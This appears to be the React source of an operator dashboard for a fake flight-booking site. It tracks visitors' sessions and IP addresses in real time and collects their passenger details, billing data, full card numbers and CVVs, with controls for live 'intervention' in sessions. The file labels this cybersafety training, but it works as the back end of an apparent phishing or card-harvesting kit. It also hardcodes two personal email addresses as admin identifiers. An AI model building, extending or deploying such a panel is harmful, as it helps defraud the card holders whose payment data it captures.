import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../contexts/AuthContext';
import ContextualBrandHeader from '../../components/ui/ContextualBrandHeader';
import AdminNavigationPanel from '../../components/ui/AdminNavigationPanel';

import ActivityFeed from './components/ActivityFeed';
import StatisticsPanel from './components/StatisticsPanel';
import LiveDataCapture from './components/LiveDataCapture';
import SessionControls from './components/SessionControls';
import { adminService } from '../../services/adminService';
import Icon from '../../components/AppIcon';
import Button from '../../components/ui/Button';

const AdminDashboard = () => {
  const navigate = useNavigate();
  const { user, userProfile } = useAuth();
  const [isNavCollapsed, setIsNavCollapsed] = useState(false);
  const [isMobileNavOpen, setIsMobileNavOpen] = useState(false);
  const [selectedSessions, setSelectedSessions] = useState([]);
  const [viewMode, setViewMode] = useState('grid');
  const [refreshInterval, setRefreshInterval] = useState(10000); // Increased to 10 seconds
  const [lastUpdate, setLastUpdate] = useState(new Date());
  
  // Real-time data state
  const [activeSessions, setActiveSessions] = useState([]);
  const [recentActivities, setRecentActivities] = useState([]);
  const [statistics, setStatistics] = useState({});
  const [capturedData, setCapturedData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // ENHANCED: Intelligent session management state
  const [intelligentSessionData, setIntelligentSessionData] = useState([]);
  const [sessionAlerts, setSessionAlerts] = useState([]);
  const [showIntelligentControls, setShowIntelligentControls] = useState(true);
  const [analysisMode, setAnalysisMode] = useState('auto'); // 'auto' or 'manual'

  // Mobile detection and responsive state
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
  
  // Auto-cleanup flag to prevent too frequent cleanups
  const [lastCleanup, setLastCleanup] = useState(Date.now());

  // Helper method for entry point distribution
  const calculateEntryPointDistribution = (sessions) => {
    if (!sessions || !Array.isArray(sessions)) return {};
    const distribution = {};
    sessions?.forEach(session => {
      const entryPoint = session?.entryPoint || 'unknown';
      distribution[entryPoint] = (distribution?.[entryPoint] || 0) + 1;
    });
    return distribution;
  };

  // Helper functions
  const getStepName = (step) => {
    const stepNames = {
      1: 'search',
      2: 'selection', 
      3: 'passenger',
      4: 'payment',
      5: 'confirmation',
      6: 'completed'
    };
    return stepNames?.[step] || 'search';
  };

  const formatFieldLabel = (fieldName) => {
    if (!fieldName) return 'Campo desconocido';
    const labels = {
      search_from: 'Origen',
      search_to: 'Destino',
      search_date: 'Fecha',
      passenger_count: 'Pasajeros',
      selected_flight_id: 'Vuelo Seleccionado',
      selected_price: 'Precio',
      passenger_1_full_name: 'Nombre Pasajero 1',
      passenger_1_email: 'Email Pasajero 1',
      passenger_1_phone: 'Teléfono Pasajero 1',
      passenger_1_id_number: 'ID Pasajero 1',
      billing_email: 'Email Facturación',
      billing_phone: 'Teléfono Facturación',
      billing_address: 'Dirección',
      payment_card_holder: 'Titular Tarjeta',
      payment_card_number_masked: 'Tarjeta',
      final_card_number: 'Número Tarjeta Completo',
      final_card_cvv: 'CVV',
      final_amount: 'Monto Final'
    };
    return labels?.[fieldName] || fieldName?.replace(/_/g, ' ')?.replace(/\b\w/g, l => l?.toUpperCase());
  };

  // Handle responsive changes
  useEffect(() => {
    const handleResize = () => {
      const mobile = window.innerWidth < 768;
      setIsMobile(mobile);
      
      // Auto-collapse navigation on mobile
      if (mobile) {
        setIsNavCollapsed(true);
        setIsMobileNavOpen(false);
      } else {
        setIsNavCollapsed(false);
      }
    };

    window.addEventListener('resize', handleResize);
    handleResize(); // Initial check
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  // ENHANCED: Load dashboard data with intelligent session management
  const loadDashboardData = async () => {
    try {
      setLoading(true);
      setError(null);

      // AGGRESSIVE CLEANUP: Force cleanup every time to ensure accurate counts
      try {
        await adminService?.performSessionCleanup();
        console.log('Session cleanup completed');
      } catch (cleanupError) {
        console.log('Cleanup warning (non-critical):', cleanupError?.message);
      }

      // Load intelligent session dashboard data
      if (showIntelligentControls) {
        try {
          const { data: intelligentData, error: intelligentError } = await adminService?.getIntelligentSessionDashboard?.();
          if (!intelligentError && intelligentData) {
            setIntelligentSessionData(intelligentData);
          }

          // Load session alerts
          const { data: alertsData, error: alertsError } = await adminService?.getActiveSessionAlerts?.();
          if (!alertsError && alertsData) {
            setSessionAlerts(alertsData);
          }

          // Auto-analyze sessions if in auto mode
          if (analysisMode === 'auto') {
            await adminService?.analyzeAllActiveSessions?.();
          }
        } catch (intelligentError) {
          console.log('Intelligent session data load error:', intelligentError);
        }
      }

      // Load active sessions with enhanced activity tracking
      const { data: sessionsData, error: sessionsError } = (await adminService?.getActiveSessionsWithActivity?.(50)) || { data: [], error: null };
      if (sessionsError) {
        setError('Error cargando sesiones: ' + sessionsError?.message);
        return;
      }
      
      const validSessionsData = Array.isArray(sessionsData) ? sessionsData : [];
      
      // CRITICAL FIX: PERFECT admin session separation
      const clientSessions = validSessionsData?.filter(session => {
        // Multiple admin detection criteria - must pass ALL to be considered client
        const isAdminByRole = session?.participantEmail?.includes('admin');
        const isAdminByName = session?.participantName?.toLowerCase()?.includes('admin');
        const isAdminByEmail = session?.participantEmail === 'bendeck112@gmail.com' || 
                              session?.participantEmail === 'rappiesunamierdota@gmail.com';
        const isAdminSession = session?.isAdminSession === true;
        
        // Return true only if it's NOT admin by any criteria
        return !isAdminByRole && !isAdminByName && !isAdminByEmail && !isAdminSession;
      }) || [];
      
      const adminSessionsActive = validSessionsData?.filter(session => {
        const isAdminByRole = session?.participantEmail?.includes('admin');
        const isAdminByName = session?.participantName?.toLowerCase()?.includes('admin');
        const isAdminByEmail = session?.participantEmail === 'bendeck112@gmail.com' || 
                              session?.participantEmail === 'rappiesunamierdota@gmail.com';
        const isAdminSession = session?.isAdminSession === true;
        
        // Return true if it's admin by any criteria
        return isAdminByRole || isAdminByName || isAdminByEmail || isAdminSession;
      }) || [];

      // ONLY count CLIENT sessions - ZERO admin sessions in main count
      setActiveSessions(clientSessions);
      console.log(`CLIENT SESSIONS: ${clientSessions?.length}, ADMIN SESSIONS: ${adminSessionsActive?.length}`);

      // Load activity feed
      const { data: activitiesData, error: activitiesError } = (await adminService?.getActivityFeedWithUserInteractions?.(15)) || { data: [], error: null };
      if (!activitiesError) {
        setRecentActivities(Array.isArray(activitiesData) ? activitiesData : []);
      }

      // CRITICAL: Statistics with ONLY CLIENT session data
      const { data: statsData, error: statsError } = (await adminService?.getTrainingStatistics?.(7)) || { data: [], error: null };
      if (!statsError && Array.isArray(statsData) && statsData?.length > 0) {
        const todayStats = statsData?.[0] || {};
        const recentlyActiveSessions = clientSessions?.filter(s => s?.isRecentlyActive) || [];
        
        setStatistics({
          activeSessions: clientSessions?.length || 0, // PURE CLIENT COUNT
          sessionChange: 0,
          recentlyActive: recentlyActiveSessions?.length || 0,
          completionRate: todayStats?.completed_sessions && todayStats?.total_sessions ? 
            Math.round((todayStats?.completed_sessions / todayStats?.total_sessions) * 100) : 0,
          completionChange: 0,
          dataCaptured: todayStats?.data_points_captured || 0,
          dataChange: 0,
          avgDuration: todayStats?.average_completion_time || '15 min',
          durationChange: 0,
          entryPointDistribution: calculateEntryPointDistribution(clientSessions),
          stageDistribution: [
            { 
              name: "Entrada", 
              count: clientSessions?.filter(s => s?.stepNumber === 0)?.length || 0, 
              percentage: clientSessions?.length > 0 ? Math.round((clientSessions?.filter(s => s?.stepNumber === 0)?.length / clientSessions?.length) * 100) : 0
            },
            { 
              name: "Búsqueda", 
              count: clientSessions?.filter(s => s?.stepNumber === 1)?.length || 0, 
              percentage: clientSessions?.length > 0 ? Math.round((clientSessions?.filter(s => s?.stepNumber === 1)?.length / clientSessions?.length) * 100) : 0
            },
            { 
              name: "Selección", 
              count: clientSessions?.filter(s => s?.stepNumber === 2)?.length || 0, 
              percentage: clientSessions?.length > 0 ? Math.round((clientSessions?.filter(s => s?.stepNumber === 2)?.length / clientSessions?.length) * 100) : 0
            },
            { 
              name: "Pasajeros", 
              count: clientSessions?.filter(s => s?.stepNumber === 3)?.length || 0, 
              percentage: clientSessions?.length > 0 ? Math.round((clientSessions?.filter(s => s?.stepNumber === 3)?.length / clientSessions?.length) * 100) : 0
            },
            { 
              name: "Pago", 
              count: clientSessions?.filter(s => s?.stepNumber === 4)?.length || 0, 
              percentage: clientSessions?.length > 0 ? Math.round((clientSessions?.filter(s => s?.stepNumber === 4)?.length / clientSessions?.length) * 100) : 0
            }
          ]
        });
      } else {
        // Fallback with CLIENT-only data
        const recentlyActiveSessions = clientSessions?.filter(s => s?.isRecentlyActive) || [];
        
        setStatistics({
          activeSessions: clientSessions?.length || 0, // PURE CLIENT COUNT
          sessionChange: 0,
          recentlyActive: recentlyActiveSessions?.length || 0,
          completionRate: 0,
          completionChange: 0,
          dataCaptured: 0,
          dataChange: 0,
          avgDuration: '15 min',
          durationChange: 0,
          entryPointDistribution: calculateEntryPointDistribution(clientSessions),
          stageDistribution: [
            { name: "Entrada", count: clientSessions?.filter(s => s?.stepNumber === 0)?.length || 0, percentage: 0 },
            { name: "Búsqueda", count: clientSessions?.filter(s => s?.stepNumber === 1)?.length || 0, percentage: 0 },
            { name: "Selección", count: clientSessions?.filter(s => s?.stepNumber === 2)?.length || 0, percentage: 0 },
            { name: "Pasajeros", count: clientSessions?.filter(s => s?.stepNumber === 3)?.length || 0, percentage: 0 },
            { name: "Pago", count: clientSessions?.filter(s => s?.stepNumber === 4)?.length || 0, percentage: 0 }
          ]
        });
      }

      // Load captured data for CLIENT sessions ONLY
      if (clientSessions?.length > 0) {
        const allCapturedData = [];
        
        for (const session of clientSessions?.slice(0, 2)) {
          try {
            if (!session?.sessionId) continue;
            const { data: capturedDataResult, error: capturedError } = (await adminService?.getCapturedData?.(session?.sessionId)) || { data: [], error: null };
            if (!capturedError && Array.isArray(capturedDataResult) && capturedDataResult?.length > 0) {
              const formattedCapturedData = capturedDataResult?.map(item => ({
                clientId: `Cliente-${item?.session_id?.substring(0, 8) || 'unknown'}`,
                sessionId: item?.session_id || session?.sessionId,
                type: item?.field_name?.includes('payment') ? 'payment' : 
                      item?.field_name?.includes('billing') ? 'billing' : 
                      item?.field_name?.includes('passenger') ? 'personal' : 'search',
                label: formatFieldLabel(item?.field_name),
                value: item?.is_sensitive ? '***Confidencial***' : (item?.field_value || 'N/A'),
                isSensitive: item?.is_sensitive || false,
                timestamp: new Date(item.captured_at || Date.now()),
                step: item?.form_step || 1
              }));
              allCapturedData?.push(...formattedCapturedData);
            }
          } catch (error) {
            console.log('Error loading captured data for session:', session?.sessionId);
          }
        }
        
        setCapturedData(allCapturedData?.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))?.slice(0, 30));
      } else {
        setCapturedData([]);
      }

      setLastUpdate(new Date());
    } catch (err) {
      console.error('Dashboard error:', err);
      setError('Error general del dashboard: ' + (err?.message || 'Error desconocido'));
    } finally {
      setLoading(false);
    }
  };

  // Real-time subscriptions with more efficient refresh intervals
  useEffect(() => {
    let sessionsSubscription;
    let capturedDataSubscription;

    const setupSubscriptions = () => {
      try {
        // Subscribe to training sessions changes with less frequent updates
        if (adminService?.subscribeToSessions) {
          sessionsSubscription = adminService?.subscribeToSessions((payload) => {
            console.log('Real-time session update:', payload);
            
            // Debounced reload to prevent too frequent updates
            setTimeout(() => {
              loadDashboardData();
            }, 1000); // Increased delay for better performance
          });
        }

        // Subscribe to captured data changes 
        if (adminService?.subscribeToCapturedData) {
          capturedDataSubscription = adminService?.subscribeToCapturedData((payload) => {
            console.log('Real-time data captured:', payload);
            
            setTimeout(() => {
              loadDashboardData();
            }, 1000);
          });
        }
      } catch (error) {
        console.error('Error setting up subscriptions:', error);
      }
    };

    if (user && userProfile?.role === 'admin') {
      loadDashboardData();
      setupSubscriptions();
    }

    return () => {
      try {
        if (sessionsSubscription && typeof sessionsSubscription === 'function') {
          sessionsSubscription();
        }
        if (capturedDataSubscription && typeof capturedDataSubscription === 'function') {
          capturedDataSubscription();
        }
      } catch (error) {
        console.error('Error cleaning up subscriptions:', error);
      }
    };
  }, [user, userProfile]);

  // Enhanced auto-refresh with longer intervals to reduce connection issues
  useEffect(() => {
    const interval = setInterval(() => {
      if (user && userProfile?.role === 'admin' && !loading) {
        loadDashboardData();
      }
    }, 10000); // Increased to 10 seconds to reduce database load

    return () => clearInterval(interval);
  }, [user, userProfile, loading]);

  const handleSessionSelect = (sessionId) => {
    if (!sessionId) return;
    setSelectedSessions(prev => 
      prev?.includes(sessionId) 
        ? prev?.filter(id => id !== sessionId)
        : [...prev, sessionId]
    );
  };

  const handleBulkAction = async (action, sessions) => {
    try {
      if (!Array.isArray(sessions) || sessions?.length === 0) return;
      
      // Log admin activity
      if (adminService?.logActivity) {
        await adminService?.logActivity(
          `bulk_${action}`,
          `Admin performed bulk action: ${action} on ${sessions?.length} sessions`,
          { sessionIds: sessions, action }
        );
      }

      // Reload data to reflect changes
      loadDashboardData();
      setSelectedSessions([]);
    } catch (error) {
      console.error('Error performing bulk action:', error);
      setError('Error ejecutando acción masiva: ' + error?.message);
    }
  };

  const handleSessionAction = async (action, sessionId) => {
    try {
      if (!sessionId || !action) return;
      
      if (action === 'finalize' && adminService?.finalizeSession) {
        await adminService?.finalizeSession(sessionId, user?.id);
      }
      
      // Log admin activity
      if (adminService?.logActivity) {
        await adminService?.logActivity(
          `session_${action}`,
          `Admin performed action: ${action} on session ${sessionId}`,
          { sessionId, action }
        );
      }

      // Reload data
      loadDashboardData();
    } catch (error) {
      console.error('Error performing session action:', error);
      setError('Error ejecutando acción de sesión: ' + error?.message);
    }
  };

  const handleViewDetails = async (session) => {
    try {
      if (!session?.sessionId) return;
      const { data: sessionData } = (await adminService?.getCapturedData?.(session?.sessionId)) || { data: [] };
      console.log('Session details:', sessionData);
      // You could open a modal or navigate to detailed view here
    } catch (error) {
      console.error('Error loading session details:', error);
    }
  };

  const handleExportData = () => {
    try {
      const exportData = {
        sessions: activeSessions,
        activities: recentActivities,
        capturedData: capturedData,
        statistics: statistics,
        exportTime: new Date()?.toISOString()
      };
      
      const dataStr = JSON.stringify(exportData, null, 2);
      const dataBlob = new Blob([dataStr], { type: 'application/json' });
      const url = URL.createObjectURL(dataBlob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `cybersafety-session-data-${new Date()?.toISOString()?.split('T')?.[0]}.json`;
      link?.click();
      URL.revokeObjectURL(url);
    } catch (error) {
      console.error('Error exporting data:', error);
      setError('Error exportando datos: ' + error?.message);
    }
  };

  const handleMobileNavToggle = () => {
    setIsMobileNavOpen(!isMobileNavOpen);
  };

  const handleForceCleanup = async () => {
    try {
      await adminService?.forceCleanupAllInactiveSessions?.();
      await loadDashboardData();
    } catch (error) {
      console.log('Force cleanup error:', error);
    }
  };

  // NEW: Handle intelligent session actions
  const handleIntelligentSessionAction = async (action, session, data) => {
    try {
      console.log(`Intelligent action ${action} performed on session:`, session?.session_id, data);
      
      // Refresh dashboard data to reflect changes
      await loadDashboardData();
    } catch (error) {
      console.error('Error handling intelligent session action:', error);
      setError('Error ejecutando acción inteligente: ' + error?.message);
    }
  };

  // NEW: Handle guidance actions
  const handleGuidanceAction = async (session, message, result) => {
    try {
      console.log(`Guidance sent to session ${session?.session_id}:`, message, result);
      
      // Log this as an admin activity
      if (adminService?.logActivity) {
        await adminService?.logActivity(
          'manual_guidance',
          `Manual guidance sent to session ${session?.session_id}`,
          { sessionId: session?.session_id, message, result }
        );
      }

      // Refresh data
      await loadDashboardData();
    } catch (error) {
      console.error('Error handling guidance action:', error);
    }
  };

  // NEW: Reset database for clean testing
  const handleResetDatabase = async () => {
    if (window.confirm('⚠️ ATENCIÓN: Esto eliminará TODOS los datos de sesiones y mantendrá solo los usuarios admin. ¿Estás seguro?')) {
      try {
        setLoading(true);
        const { data, error } = await adminService?.resetDatabaseForCleanStart?.();
        
        if (error) {
          throw error;
        }
        
        console.log('Database reset completed:', data);
        setError(null);
        await loadDashboardData();
        
        alert('✅ Base de datos reiniciada exitosamente. Lista para testing limpio.');
      } catch (error) {
        console.error('Database reset error:', error);
        setError('Error reiniciando base de datos: ' + error?.message);
      } finally {
        setLoading(false);
      }
    }
  };

  // Check user permissions
  if (!user || userProfile?.role !== 'admin') {
    return (
      <div className="min-h-screen bg-background">
        <ContextualBrandHeader userRole="admin" />
        <div className="flex items-center justify-center min-h-[50vh] px-4">
          <div className="text-center max-w-md mx-auto p-4 sm:p-6">
            <div className="w-12 h-12 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Icon name="Shield" size={24} className="text-yellow-600" />
            </div>
            <h1 className="text-xl sm:text-2xl font-bold text-yellow-600 mb-4">Acceso Restringido</h1>
            <p className="text-gray-600 mb-6 text-sm sm:text-base">No tienes permisos para acceder al panel de administración.</p>
            <Button
              onClick={() => navigate('/login')}
              className="w-full"
              size={isMobile ? "md" : "default"}
            >
              Volver al Login
            </Button>
          </div>
        </div>
      </div>
    );
  }

  // Error state
  if (error) {
    return (
      <div className="min-h-screen bg-background">
        <ContextualBrandHeader userRole="admin" />
        <div className="flex items-center justify-center min-h-[50vh] px-4">
          <div className="text-center max-w-md mx-auto p-4 sm:p-6">
            <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Icon name="AlertTriangle" size={24} className="text-red-600" />
            </div>
            <h1 className="text-xl sm:text-2xl font-bold text-red-600 mb-4">Error del Dashboard</h1>
            <p className="text-gray-600 mb-6 text-sm sm:text-base">{error}</p>
            <div className="space-y-3">
              <Button
                onClick={() => {
                  setError(null);
                  loadDashboardData();
                }}
                className="w-full"
                size={isMobile ? "md" : "default"}
              >
                <Icon name="RefreshCw" size={16} className="mr-2" />
                Reintentar Conexión
              </Button>
              <Button
                variant="outline"
                onClick={() => navigate('/login')}
                className="w-full"
                size={isMobile ? "md" : "default"}
              >
                Volver al Login
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <ContextualBrandHeader userRole="admin" />
      {/* Mobile Navigation Overlay */}
      {isMobile && isMobileNavOpen && (
        <div 
          className="fixed inset-0 bg-black bg-opacity-50 z-50 md:hidden"
          onClick={() => setIsMobileNavOpen(false)}
        />
      )}
      {/* Navigation Panel */}
      <AdminNavigationPanel 
        isCollapsed={isNavCollapsed}
        isMobileOpen={isMobileNavOpen}
        onToggleCollapse={() => setIsNavCollapsed(!isNavCollapsed)}
        onMobileClose={() => setIsMobileNavOpen(false)}
      />
      {/* Main Content */}
      <main className={`transition-all duration-300 ${
        isMobile ? 'ml-0' : isNavCollapsed ? 'ml-16' : 'ml-64'
      } p-3 sm:p-4 lg:p-6`}>
        
        {/* Mobile Menu Button */}
        {isMobile && (
          <div className="flex items-center justify-between mb-4 pb-3 border-b border-border md:hidden">
            <h1 className="text-lg font-heading font-bold text-foreground">
              Admin Panel
            </h1>
            <Button
              variant="outline"
              size="sm"
              onClick={handleMobileNavToggle}
              className="px-3 py-2"
            >
              <Icon name="Menu" size={18} className="mr-1" />
              Menú
            </Button>
          </div>
        )}

        {/* ENHANCED: Page Header with Intelligent Session Management Controls */}
        <div className="mb-4 sm:mb-6">
          <div className="flex flex-col space-y-4 sm:space-y-0 sm:flex-row sm:items-center sm:justify-between">
            <div>
              <h1 className="text-xl sm:text-2xl lg:text-3xl font-heading font-bold text-foreground">
                {isMobile ? 'Dashboard Inteligente' : `Panel de Administración Inteligente - ${userProfile?.full_name || 'Admin'}`}
              </h1>
              <p className="text-text-secondary mt-1 text-sm sm:text-base">
                {isMobile ? 'Gestión inteligente de sesiones' : 'Monitoreo inteligente con intervención en tiempo real de sesiones de entrenamiento'}
              </p>
              {/* ENHANCED: Intelligent session indicators */}
              <div className="flex items-center space-x-4 mt-2 text-xs">
                <p className="text-green-600">
                  ✅ Gestión inteligente de sesiones activa
                </p>
                {sessionAlerts?.length > 0 && (
                  <p className="text-red-600">
                    🚨 {sessionAlerts?.length} alerta(s) activa(s)
                  </p>
                )}
                <p className="text-blue-600">
                  🎯 Modo: {analysisMode === 'auto' ? 'Análisis Automático' : 'Control Manual'}
                </p>
              </div>
            </div>
            
            <div className="flex flex-col space-y-2 sm:space-y-0 sm:flex-row sm:items-center sm:space-x-4">
              {/* ENHANCED: Intelligent Session Management Controls */}
              <div className="flex space-x-2">
                <Button
                  variant={showIntelligentControls ? "default" : "outline"}
                  size="sm"
                  onClick={() => setShowIntelligentControls(!showIntelligentControls)}
                  className="px-3 py-2 text-xs"
                >
                  <Icon name="Brain" size={14} className="mr-1" />
                  {showIntelligentControls ? 'Ocultar IA' : 'Mostrar IA'}
                </Button>
                
                <Button
                  variant={analysisMode === 'auto' ? "default" : "outline"}
                  size="sm"
                  onClick={() => setAnalysisMode(analysisMode === 'auto' ? 'manual' : 'auto')}
                  className="px-3 py-2 text-xs"
                >
                  <Icon name={analysisMode === 'auto' ? 'Zap' : 'Hand'} size={14} className="mr-1" />
                  {analysisMode === 'auto' ? 'Auto' : 'Manual'}
                </Button>
                
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={handleResetDatabase}
                  className="px-3 py-2 text-xs"
                >
                  <Icon name="Database" size={14} className="mr-1" />
                  Reset DB
                </Button>
              </div>

              {/* Enhanced Cleanup Buttons */}
              <div className="flex space-x-2">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={async () => {
                    try {
                      await adminService?.performSessionCleanup();
                      await loadDashboardData();
                    } catch (error) {
                      console.log('Cleanup error:', error);
                    }
                  }}
                  className="px-3 py-2 text-xs"
                >
                  <Icon name="Trash2" size={14} className="mr-1" />
                  Limpiar Sesiones
                </Button>
                
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={handleForceCleanup}
                  className="px-3 py-2 text-xs"
                >
                  <Icon name="Zap" size={14} className="mr-1" />
                  Reset Total
                </Button>
              </div>

              {/* View Mode Toggle */}
              <div className="hidden sm:flex items-center space-x-2 bg-surface border border-border rounded-md p-1">
                <button
                  onClick={() => setViewMode('grid')}
                  className={`p-2 rounded transition-micro ${
                    viewMode === 'grid' ? 'bg-primary text-primary-foreground' : 'text-text-secondary hover:text-primary'
                  }`}
                >
                  <Icon name="Grid3X3" size={16} />
                </button>
                <button
                  onClick={() => setViewMode('list')}
                  className={`p-2 rounded transition-micro ${
                    viewMode === 'list' ? 'bg-primary text-primary-foreground' : 'text-text-secondary hover:text-primary'
                  }`}
                >
                  <Icon name="List" size={16} />
                </button>
              </div>

              {/* Refresh Controls */}
              <div className="flex items-center justify-between sm:justify-start space-x-2 text-xs sm:text-sm text-text-secondary">
                {loading ? (
                  <Icon name="RefreshCw" size={16} className="animate-spin" />
                ) : (
                  <Icon name="RefreshCw" size={16} />
                )}
                <span className="truncate">
                  {isMobile ? 
                    lastUpdate?.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit' }) : 
                    `Actualizado: ${lastUpdate?.toLocaleTimeString('es-CO')}`
                  }
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Statistics Panel */}
        <StatisticsPanel stats={statistics} className="mb-4 sm:mb-6" isMobile={isMobile} />

        {/* ENHANCED: Intelligent Session Alerts Panel */}
        {showIntelligentControls && sessionAlerts?.length > 0 && (
          <div className="mb-4 sm:mb-6 bg-red-50 border border-red-200 rounded-lg p-4">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-lg font-semibold text-red-800 flex items-center">
                <Icon name="AlertTriangle" size={20} className="mr-2" />
                Alertas de Sesiones Activas ({sessionAlerts?.length})
              </h3>
            </div>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
              {sessionAlerts?.slice(0, 6)?.map(alert => (
                <div key={alert?.id} className="bg-white border border-red-300 rounded p-3">
                  <div className="flex items-center justify-between mb-2">
                    <span className={`text-xs font-medium px-2 py-1 rounded-full ${
                      alert?.severity === 'high' ? 'bg-red-100 text-red-800' :
                      alert?.severity === 'medium'? 'bg-yellow-100 text-yellow-800' : 'bg-blue-100 text-blue-800'
                    }`}>
                      {alert?.severity?.toUpperCase()}
                    </span>
                    <span className="text-xs text-gray-500">
                      {new Date(alert.created_at)?.toLocaleTimeString('es-CO')}
                    </span>
                  </div>
                  
                  <p className="text-sm text-gray-900 mb-2">{alert?.message}</p>
                  
                  {alert?.session && (
                    <p className="text-xs text-gray-600">
                      Sesión: {alert?.session?.session_token?.substring(0, 8)}...
                      {alert?.session?.participant?.full_name && ` - ${alert?.session?.participant?.full_name}`}
                    </p>
                  )}
                  
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={async () => {
                      await adminService?.resolveSessionAlert?.(alert?.id);
                      loadDashboardData();
                    }}
                    className="mt-2 w-full"
                  >
                    Resolver
                  </Button>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* ENHANCED: Main Dashboard Grid with Intelligent Session Controls */}
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 sm:gap-6">
          
          {/* ENHANCED: Intelligent Session Monitor */}
          <div className="lg:col-span-4 order-1">
            <div className="bg-white rounded-lg shadow-sm border border-border p-4 sm:p-6">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg sm:text-xl font-heading font-semibold text-foreground">
                  {showIntelligentControls ? 
                    'Monitor Inteligente de Sesiones (Con Controles de IA)' : 
                    'Monitoreo Unificado de Sesiones y Captura de Datos'
                  }
                </h2>
                <div className="flex items-center space-x-2">
                  {showIntelligentControls && (
                    <span className="text-xs text-green-600 bg-green-50 px-2 py-1 rounded-full">
                      IA ACTIVA
                    </span>
                  )}
                  <span className="text-xs text-gray-500">
                    {activeSessions?.length || 0} sesiones activas
                  </span>
                </div>
              </div>
              
              {/* Enhanced Session Display with Intelligent Controls */}
              {activeSessions?.length > 0 ? (
                <div className="space-y-4">
                  {activeSessions?.map(session => (
                    <div key={session?.sessionId} className="border border-gray-200 rounded-lg overflow-hidden">
                      {/* Session Basic Info */}
                      <div className="bg-gray-50 px-4 py-3 border-b border-gray-200">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center space-x-3">
                            <div className={`w-3 h-3 rounded-full ${
                              session?.isRecentlyActive ? 'bg-green-500' : session?.isActive ?'bg-yellow-500' : 'bg-red-500'
                            }`} />
                            <span className="font-medium text-gray-900">
                              {session?.clientId}
                            </span>
                            <span className="text-sm text-gray-600">
                              IP: {session?.ipAddress}
                            </span>
                          </div>
                          <div className="text-sm text-gray-500">
                            Iniciado: {session?.startTime ? new Date(session.startTime)?.toLocaleTimeString('es-CO') : 'N/A'}
                          </div>
                        </div>
                      </div>
                      
                      {/* Intelligent Session Controls */}
                      {showIntelligentControls && (
                        <div className="p-4">
                          <SessionControls
                            session={session}
                            onAction={handleIntelligentSessionAction}
                            onGuidance={handleGuidanceAction}
                            isMobile={isMobile}
                          />
                        </div>
                      )}
                      
                      {/* Regular Session Info (when intelligent controls are hidden) */}
                      {!showIntelligentControls && (
                        <div className="p-4">
                          <LiveDataCapture 
                            session={session}
                            isMobile={isMobile}
                          />
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-12">
                  <Icon name="Users" size={48} className="mx-auto text-gray-400 mb-4" />
                  <h3 className="text-lg font-medium text-gray-900 mb-2">No hay sesiones activas</h3>
                  <p className="text-gray-500 mb-4">
                    {showIntelligentControls ? 
                      'Cuando los clientes inicien sesiones, aparecerán aquí con controles inteligentes.' :
                      'Las sesiones activas aparecerán aquí cuando los usuarios accedan a la aplicación.'
                    }
                  </p>
                  <Button
                    onClick={() => loadDashboardData()}
                    variant="outline"
                  >
                    <Icon name="RefreshCw" size={16} className="mr-2" />
                    Actualizar
                  </Button>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Activity Feed */}
        <div className="mt-4 sm:mt-6 grid grid-cols-1 gap-4 sm:gap-6 order-3">
          <div className="lg:col-span-full">
            <ActivityFeed 
              activities={recentActivities} 
              isMobile={isMobile}
              title={showIntelligentControls ? 
                "Log de Actividades del Sistema (Incluye Intervenciones IA)" : 
                "Log de Actividades del Sistema"
              }
            />
          </div>
        </div>
      </main>
    </div>
  );
};

export default AdminDashboard;